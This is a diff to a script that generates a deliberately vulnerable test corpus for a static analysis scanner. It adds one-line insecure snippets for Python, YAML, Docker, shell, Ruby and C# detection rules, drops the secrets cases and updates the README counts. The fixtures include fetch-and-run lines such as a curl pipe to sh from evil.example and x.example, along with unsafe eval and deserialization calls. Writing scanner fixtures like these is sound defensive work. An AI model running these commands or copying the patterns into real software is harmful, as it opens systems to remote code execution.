@@ -20,7 +20,7 @@ TESTBED = ROOT / "testbed"
 
 # (relative path, expected rule id(s), source)
 CASES: list[tuple[str, list[str], str]] = [
-    # ---- Python (22) ----
+    # ---- Python (23) ----
     ("python/py_eval.py", ["megasast/py-eval"],
      '# rule: megasast/py-eval\neval(user_input)\n'),
     ("python/py_exec.py", ["megasast/py-exec"],
@@ -65,6 +65,39 @@ CASES: list[tuple[str, list[str], str]] = [
      '# rule: megasast/py-sql-fstring\ncursor.execute(f"select * from t where a={user_input}")\n'),
     ("python/py_flask_debug.py", ["megasast/py-flask-debug"],
      '# rule: megasast/py-flask-debug\napp.run(debug=True)\n'),
+    ("python/py_yaml_unsafe_load.py", ["megasast/py-yaml-unsafe-load"],
+     '# rule: megasast/py-yaml-unsafe-load\nimport yaml\nobj = yaml.unsafe_load(stream)\n'),
+    # ---- YAML (3) ----
+    ("yaml/yaml_unpinned_action.yml", ["megasast/yaml-unpinned-action"],
+     '# rule: megasast/yaml-unpinned-action\n- uses: actions/checkout@v4\n  with:\n    fetch-depth: 0\n'),
+    ("yaml/yaml_pr_target_trigger.yml", ["megasast/yaml-pr-target-trigger"],
+     '# rule: megasast/yaml-pr-target-trigger\non:\n  pull_request_target:\n    types: [opened]\njobs:\n  b:\n    runs-on: ubuntu-latest\n'),
+    ("yaml/yaml_k8s_privileged.yml", ["megasast/yaml-k8s-privileged"],
+     '# rule: megasast/yaml-k8s-privileged\nspec:\n  containers:\n    - name: c\n      image: nginx\n      privileged: true\n'),
+    # ---- Dockerfile (3) ----
+    ("docker/docker_curl_pipe_sh.dockerfile", ["megasast/docker-curl-pipe-sh"],
+     '# rule: megasast/docker-curl-pipe-sh\nFROM alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nRUN curl http://evil.example/x.sh | sh\n'),
+    ("docker/docker_unpinned_image.dockerfile", ["megasast/docker-unpinned-image"],
+     '# rule: megasast/docker-unpinned-image\nFROM alpine:3\nRUN make test\n'),
+    ("docker/docker_add_url.dockerfile", ["megasast/docker-add-url"],
+     '# rule: megasast/docker-add-url\nFROM busybox@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nADD https://example.com/x.sh /x.sh\n'),
+    # ---- Shell (3) ----
+    ("shell/sh_eval.sh", ["megasast/sh-eval"],
+     '# rule: megasast/sh-eval\neval "$cmd"\n'),
+    ("shell/sh_curl_pipe_sh.sh", ["megasast/sh-curl-pipe-sh"],
+     '# rule: megasast/sh-curl-pipe-sh\ncurl -fsSL https://x.example/install.sh | sh\n'),
+    ("shell/sh_source_variable.sh", ["megasast/sh-source-variable"],
+     '# rule: megasast/sh-source-variable\nsource "$1"\n'),
+    # ---- Ruby (2) ----
+    ("ruby/ru_eval.rb", ["megasast/ru-eval"],
+     '# rule: megasast/ru-eval\neval(user_input)\n'),
+    ("ruby/ru_marshal_load.rb", ["megasast/ru-marshal-load"],
+     '# rule: megasast/ru-marshal-load\nMarshal.load(data)\n'),
+    # ---- C# (2) ----
+    ("csharp/csharp_process_start.cs", ["megasast/csharp-process-start"],
+     '// rule: megasast/csharp-process-start\nProcess.Start(cmd, args);\n'),
+    ("csharp/csharp_shell_execute.cs", ["megasast/csharp-shell-execute"],
+     '// rule: megasast/csharp-shell-execute\nvar psi = new ProcessStartInfo { UseShellExecute = true };\n'),
     # ---- JavaScript (14) ----
     ("javascript/js_eval.js", ["megasast/js-eval"],
      '// rule: megasast/js-eval\neval(userInput);\n'),
@@ -242,19 +275,15 @@ CASES: list[tuple[str, list[str], str]] = [
      '<!-- rule: megasast/html-insecure-iframe-src -->\n<iframe src="http://evil.example/frame"></iframe>\n'),
     ("html/html_meta_refresh_js.html", ["megasast/html-meta-refresh-js"],
      '<!-- rule: megasast/html-meta-refresh-js -->\n<meta http-equiv="refresh" content="0;url=javascript:alert(1)">\n'),
-    # ---- Cross-language secrets (3, python representative) ----
-    ("secrets/aws_access_key.py", ["megasast/aws-access-key"],
-     '# rule: megasast/aws-access-key\nk = "AKIAIOSFODNN7EXAMPLE"\n'),
-    ("secrets/hardcoded_secret.py", ["megasast/hardcoded-secret"],
-     '# rule: megasast/hardcoded-secret\npassword = "secret123value"\n'),
-    ("secrets/insecure_rand.py", ["megasast/insecure-rand"],
+    # ---- Cross-language crypto (1, python representative) ----
+    ("crypto/insecure_rand.py", ["megasast/insecure-rand"],
      '# rule: megasast/insecure-rand\nimport random\ntoken = random.choice(items)\n'),
 ]
 
 README = """# megasast testbed
 
-Synthetic vulnerable-by-design corpus: **one file per rule** (109 files,
-109 rules). Each file contains a minimal true positive and a header comment
+Synthetic vulnerable-by-design corpus: **one file per rule** (121 files,
+121 rules). Each file contains a minimal true positive and a header comment
 with the expected rule id(s).
 
 Intentionally vulnerable — do not deploy, do not copy patterns into
@@ -268,8 +297,8 @@ megasast scan testbed -o report.sarif --format sarif
 ```
 
 Expected: every file fires its documented rule. `go/go_exec_shell.go`
-fires twice (`go-exec-cmd` + `go-exec-shell`) by design, so 109 files
-yield 110 findings. `manifest.json` records the per-file expectation.
+fires twice (`go-exec-cmd` + `go-exec-shell`) by design, so 121 files
+yield 122 findings. `manifest.json` records the per-file expectation.
 
 ## Regenerate
 
